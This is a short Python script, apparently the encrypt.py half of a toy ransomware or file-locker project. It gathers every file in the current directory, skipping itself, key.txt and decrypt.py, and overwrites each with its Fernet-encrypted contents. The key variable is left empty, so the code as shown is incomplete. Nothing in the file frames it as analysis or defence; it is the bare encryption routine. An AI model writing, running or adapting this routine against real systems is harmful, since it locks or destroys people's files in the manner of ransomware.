import os
import sys
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "key.txt" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = ""

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypt)

print("")